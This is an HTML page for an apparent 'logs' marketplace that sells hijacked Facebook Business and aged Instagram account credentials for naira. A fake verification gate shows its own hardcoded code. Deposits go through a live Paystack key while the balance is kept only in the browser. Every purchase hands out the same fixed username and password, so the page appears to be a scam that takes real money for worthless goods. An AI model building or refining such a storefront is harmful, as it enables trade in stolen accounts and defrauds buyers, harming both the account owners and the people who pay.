<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subby Logs | Official Marketplace</title>
    <script src="https://js.paystack.co/v1/inline.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #05070a; color: #ffffff; line-height: 1.6; }
        
        /* Login Gate Full Screen */
        #login-gate { position: fixed; inset: 0; background: #05070a; display: flex; align-items: center; justify-content: center; z-index: 9999; padding: 20px; }
        .gate-card { width: 100%; max-width: 400px; text-align: center; }
        
        /* Main Site Layout */
        #main-site { min-height: 100vh; display: flex; flex-direction: column; padding: 20px; max-width: 600px; margin: 0 auto; }
        
        /* Branding */
        .header { padding: 40px 0 20px; text-align: center; }
        .logo { font-size: 28px; font-weight: 800; letter-spacing: -1px; color: #0070f3; text-transform: uppercase; }
        
        /* Balance Section */
        .wallet-section { background: linear-gradient(145deg, #111, #000); padding: 30px; border-radius: 24px; border: 1px solid #333; margin-bottom: 30px; position: relative; overflow: hidden; }
        .wallet-label { font-size: 14px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
        .balance-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .balance-amount { font-size: 36px; font-weight: 700; color: #fff; }
        .add-funds-btn { background: #fff; color: #000; border: none; width: 50px; height: 50px; border-radius: 50%; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        
        /* Logs Section */
        .section-title { font-size: 18px; font-weight: 600; margin-bottom: 15px; color: #888; padding-left: 5px; }
        .item-card { background: #111; border: 1px solid #222; padding: 20px; border-radius: 18px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; transition: 0.3s; }
        .item-card:active { transform: scale(0.98); background: #1a1a1a; }
        .item-info b { display: block; font-size: 16px; margin-bottom: 4px; }
        .item-info span { font-size: 14px; color: #0070f3; font-weight: 600; }
        .buy-action-btn { background: #222; color: #fff; border: 1px solid #333; padding: 10px 20px; border-radius: 12px; font-weight: 600; cursor: pointer; }

        /* Inputs & Global Buttons */
        input { width: 100%; padding: 16px; margin: 10px 0; background: #111; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; outline: none; }
        input:focus { border-color: #0070f3; }
        .primary-btn { width: 100%; padding: 16px; background: #0070f3; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

<div id="login-gate">
    <div class="gate-card">
        <div class="logo" style="margin-bottom: 30px;">Security Portal</div>
        <p style="color: #888; margin-bottom: 20px;">Verification required to access marketplace</p>
        <input type="text" id="username" placeholder="Username">
        <input type="email" id="email" placeholder="Gmail Address">
        <button class="primary-btn" onclick="sendCode()">Access Terminal</button>
        <div id="otp-section" style="display:none; margin-top: 10px;">
            <input type="text" id="otp" placeholder="Verification Code">
            <button class="primary-btn" style="background: #fff; color: #000;" onclick="verifyCode()">Verify Identity</button>
        </div>
    </div>
</div>

<div id="main-site" style="display:none;">
    <div class="header">
        <div class="logo">Subby Market</div>
    </div>
    
    <div class="wallet-section">
        <p class="wallet-label">Available Liquidity</p>
        <div class="balance-row">
            <div class="balance-amount">₦<span id="balance">0.00</span></div>
            <button class="add-funds-btn" onclick="openPayment()">+</button>
        </div>
    </div>

    <p class="section-title">Premium Inventory</p>

    <div class="item-card">
        <div class="item-info">
            <b>📘 Facebook Business Log</b>
            <span>₦5,000.00</span>
        </div>
        <button class="buy-action-btn" onclick="buyLog('FB-LOG-HIGH', 5000)">Buy</button>
    </div>

    <div class="item-card">
        <div class="item-info">
            <b>📸 Instagram Aged Log</b>
            <span>₦3,500.00</span>
        </div>
        <button class="buy-action-btn" onclick="buyLog('IG-LOG-AGED', 3500)">Buy</button>
    </div>
</div>

<script>
    let currentBalance = 0;
    let userEmail = "";
    const LIVE_KEY = 'pk_live_241bdd6d0b4dd94ebe7f59b7d70bee5939fae661';

    function sendCode() {
        userEmail = document.getElementById('email').value;
        if(!userEmail || !userEmail.includes('@')) return alert("Please enter a valid Gmail");
        alert("Verification Code Sent to " + userEmail + "\n\nCode: 123456");
        document.getElementById('otp-section').style.display = 'block';
    }

    function verifyCode() {
        const otp = document.getElementById('otp').value;
        if(otp === '123456') {
            document.getElementById('login-gate').style.fadeOut; // Fancy logic placeholder
            document.getElementById('login-gate').style.display = 'none';
            document.getElementById('main-site').style.display = 'flex';
        } else {
            alert("Security Code Mismatch");
        }
    }

    function openPayment() {
        const amount = prompt("Enter Deposit Amount (₦):", "2000");
        if (!amount || isNaN(amount)) return;

        let handler = PaystackPop.setup({
            key: LIVE_KEY,
            email: userEmail,
            amount: amount * 100,
            currency: 'NGN',
            callback: function(response) {
                currentBalance += parseInt(amount);
                document.getElementById('balance').innerText = currentBalance.toLocaleString();
                alert("Liquidity Updated! Ref: " + response.reference);
            }
        });
        handler.openIframe();
    }

    function buyLog(name, price) {
        if (currentBalance >= price) {
            currentBalance -= price;
            document.getElementById('balance').innerText = currentBalance.toLocaleString();
            alert("ACCESS GRANTED\n\nItem: " + name + "\nData: subby_user:Pass7788\n\nCopy these details now.");
        } else {
            alert("Insufficient Liquidity. Top up your wallet.");
        }
    }
</script>

</body>
</html>
